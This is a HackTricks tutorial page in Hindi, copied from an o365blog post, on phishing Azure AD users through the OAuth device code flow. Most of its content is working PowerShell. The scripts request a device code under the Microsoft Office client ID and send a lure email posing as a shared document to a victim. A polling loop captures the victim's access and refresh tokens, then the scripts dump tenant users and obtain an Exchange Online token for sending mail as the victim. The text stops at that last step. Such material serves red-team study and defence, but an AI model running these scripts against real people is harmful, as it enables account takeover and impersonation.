# Az - рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлрд╝рд┐рд╢рд┐рдВрдЧ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

**рдпрд╣ рдкреЛрд╕реНрдЯ** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рдереА**

### рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреНрдпрд╛ рд╣реИ <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Microsoft [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг:

> рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реНрдорд╛рд░реНрдЯ рдЯреАрд╡реА, IoT рдбрд┐рд╡рд╛рдЗрд╕, рдпрд╛ рдкреНрд░рд┐рдВрдЯрд░ рдЬреИрд╕реЗ рдЗрдирдкреБрдЯ-рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдбрд┐рд╡рд╛рдЗрд╕реЛрдВ рдореЗрдВ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдбрд┐рд╡рд╛рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдЕрдиреНрдп рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдЙрдирдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдкрд░ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред рдПрдХ рдмрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдЗрди рдЗрди рдХрд░ рд▓реЗрддрд╛ рд╣реИ, рдбрд┐рд╡рд╛рдЗрд╕ рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдФрд░ рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реИ:

1. рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдлреНрд▓реЛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдРрдк рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ
2. рдРрдк Azure AD /devicecode рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ рдФрд░ **client\_id** рдФрд░ **resource** рднреЗрдЬрддрд╛ рд╣реИ
3. Azure AD **device\_code**, **user\_code**, рдФрд░ **verification\_url** рд╡рд╛рдкрд╕ рднреЗрдЬрддрд╛ рд╣реИ
4. рдбрд┐рд╡рд╛рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **verification\_url** (hxxps://microsoft.com/devicelogin) рдФрд░ **user\_code** рджрд┐рдЦрд╛рддрд╛ рд╣реИ
5. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЦреЛрд▓рддрд╛ рд╣реИ рдФрд░ **verification\_url** рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдм рдкреВрдЫрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ **user\_code** рджреЗрддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИ
6. рдбрд┐рд╡рд╛рдЗрд╕ Azure AD рдХреЛ рдкреЛрд▓ рдХрд░рддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рд╕рдлрд▓ рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж рдпрд╣ **access\_token** рдФрд░ **refresh\_token** рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд▓реЗрддрд╛

![Device Code flow](https://o365blog.com/images/posts/phishing\_5.png)

### рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╕рд╛рде рдлрд╝рд┐рд╢рд┐рдВрдЧ <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИред

1. рдПрдХ рд╣рдорд▓рд╛рд╡рд░ /devicecode рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ рдФрд░ **client\_id** рдФрд░ **resource** рднреЗрдЬрддрд╛ рд╣реИ
2. **verification\_uri** рдФрд░ **user\_code** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рдИрдореЗрд▓ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ **verification\_uri** рдФрд░ **user\_code** рдХрд╛ рд▓рд┐рдВрдХ рд╣реЛ, рдФрд░ рдЗрд╕реЗ рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬреЗрдВред
3. рдкреАрдбрд╝рд┐рдд рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рдХреЛрдб рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рдЗрди рдЗрди рдкреВрд░рд╛ рдХрд░рддрд╛ рд╣реИред
4. рд╣рдорд▓рд╛рд╡рд░ **access\_token** рдФрд░ **refresh\_token** рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдм рдкреАрдбрд╝рд┐рдд рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### 1. /devicecode рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рдирд╛ <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

рдкрд╣рд▓рд╛ рдХрджрдо Azure AD devicecode рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рдПрдХ http POST рдмрдирд╛рдирд╛ рд╣реИ:
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
рдореИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБред рдореИрдВрдиреЗ "Microsoft Office" client\_id рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЪреБрдирд╛рд╡ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рд╡реИрдз рдРрдк рдирд╛рдо рдХреА рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЪреБрдиреЗ рдЧрдП рд╕рдВрд╕рд╛рдзрди рд╕реЗ AAD Graph API рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓рддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ MSOnline PowerShell рдореЙрдбреНрдпреВрд▓ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

| рдкреИрд░рд╛рдореАрдЯрд░  | рдорд╛рди                                                      |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рдорд╛рди рд╣реЛрддреА рд╣реИ:
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| Parameter         | Description                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | рдЬрдм рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рдП рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб                |
| device\_code      | рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдП "рдкреЛрд▓" рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб      |
| verification\_url | рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╡рд╛рд▓рд╛ url               |
| expires\_in       | рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп рд╕реЗрдХрдВрдб рдореЗрдВ (15 рдорд┐рдирдЯ)                                              |
| interval          | рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рд╣рдХ рдХреЛ рдХрд┐рддрдиреА рдмрд╛рд░ рдкреЛрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рдХрд╛ рдЕрдВрддрд░рд╛рд▓ рд╕реЗрдХрдВрдб рдореЗрдВ       |
| message           | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рдВрджреЗрд╢                                 |

рдпрд╣рд╛рдБ devicelogin рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ:
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**рдзреНрдпрд╛рди рджреЗрдВ!** рдореИрдВ рд╡рд░реНрдЬрди 1.0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдЬреЛ v2.0 рдлреНрд▓реЛ рд╕реЗ рдереЛрдбрд╝рд╛ рдЕрд▓рдЧ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### 2. рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдмрдирд╛рдирд╛ <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

рдЕрдм рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **verification\_url** (рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди) рдФрд░ **user\_code** рд╣реИ, рд╣рдо рдПрдХ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред

**рдзреНрдпрд╛рди рджреЗрдВ!** рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реА smtp рд╕реЗрд╡рд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
рдкреНрд░рд╛рдкреНрдд рдИрдореЗрд▓ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ: ![Device Code flow](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. "рдордЫрд▓реА рдХреЛ рдкрдХрдбрд╝рдирд╛" - рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдирд╛ <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

рдЬрдм рдХреЛрдИ рдкреАрдбрд╝рд┐рдд рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдЗрдЯ рдкреНрд░рдХрдЯ рд╣реЛрддреА рд╣реИред рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, url рдПрдХ рд╡реИрдз Microsoft url рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдИрдореЗрд▓ рд╕реЗ рдХреЛрдб рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

![Device code](https://o365blog.com/images/posts/phishing\_7.png)

рдХреЛрдб рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ **Microsoft Office** рдореЗрдВ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ - рдХреЛрдИ рд╕рд╣рдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧреА рдЬрд╛рддреА рд╣реИред

**рдзреНрдпрд╛рди рджреЗрдВ!** рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдирд╣реАрдВ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рдВрдЧрдарди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рдЬреЛ рднреА рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

![Login](https://o365blog.com/images/posts/phishing\_8.png)

рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рд╕рдордЭреМрддрд╛ рд╣реЛ рдЧрдИ рд╣реИ!** :warning:

#### 4. рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдВрддрд┐рдо рдЪрд░рдг рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред рдЪрд░рдг 2 рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП Azure AD рдХреА рдкреЛрд▓рд┐рдВрдЧ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╣рд░ 5 рд╕реЗрдХрдВрдб рдореЗрдВ Azure AD рдЯреЛрдХрди рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рдПрдХ http POST рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП (рдХреЛрдб рдЪрд░рдг 1 рд╕реЗ device\_code рд╣реИ)

| рдкреИрд░рд╛рдореАрдЯрд░   | рдорд╛рди                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд▓рдВрдмрд┐рдд рд╣реИ, рддреЛ рдПрдХ http рддреНрд░реБрдЯрд┐ **400 Bad Request** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рд▓реМрдЯрд╛рдИ рдЬрд╛рддреА рд╣реИ:
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
рд╕рдлрд▓ рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓реЗрдЧреА (рдЯреЛрдХрди рд╕рдВрдХреНрд╖рд┐рдкреНрдд):
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ Azure AD рдЯреЛрдХрди рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рддреА рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП рдкреЛрд▓ рдХрд░рддреА рд╣реИред
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
рдЕрдм рд╣рдо рдкреАрдбрд╝рд┐рдд рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
рд╣рдо рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╢рд░реНрддреЗ рдХреНрд▓рд╛рдЗрдВрдЯ\_рдЖрдИрдбреА рд╕рдорд╛рди рд░рд╣реЗред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ Exchange Online рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рддреА рд╣реИред
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

